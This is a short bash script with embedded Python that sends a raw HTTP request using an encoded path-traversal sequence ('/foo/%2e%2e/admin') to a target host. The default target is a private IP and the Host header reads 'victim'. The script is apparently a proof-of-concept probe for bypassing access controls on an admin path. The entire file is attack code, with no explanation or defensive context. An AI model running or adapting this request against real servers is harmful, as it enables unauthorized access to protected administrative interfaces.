#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-10.201.0.20}"
python3 - "$TARGET" <<'PY'
import socket
import sys

target = sys.argv[1]
request = b"GET /foo/%2e%2e/admin HTTP/1.1\r\nHost: victim\r\nConnection: close\r\n\r\n"

with socket.create_connection((target, 80), timeout=5) as sock:
    sock.sendall(request)
    sock.recv(4096)
PY
